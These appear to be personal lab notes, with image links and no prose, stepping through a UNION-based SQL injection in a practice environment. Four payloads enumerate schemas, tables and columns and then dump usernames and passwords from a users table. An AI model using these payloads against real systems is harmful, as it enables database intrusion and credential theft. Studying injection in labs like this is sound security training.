
![[Pasted image 20251212203223.png]]

![[Pasted image 20251212203247.png]]
```
' UNION SELECT schema_name,'xyz' from INFORMATION_SCHEMA.SCHEMATA-- -
```
![[Pasted image 20251212203355.png]]

```
' UNION SELECT TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='public'-- -
```
![[Pasted image 20251212203711.png]]

```
' UNION SELECT TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users_evhifo'-- -
```
![[Pasted image 20251212204012.png]]

```
' UNION SELECT username_ucapnl,password_hiyvrf from users_evhifo-- -
```
![[Pasted image 20251212204309.png]]


![[Pasted image 20251212204530.png]]
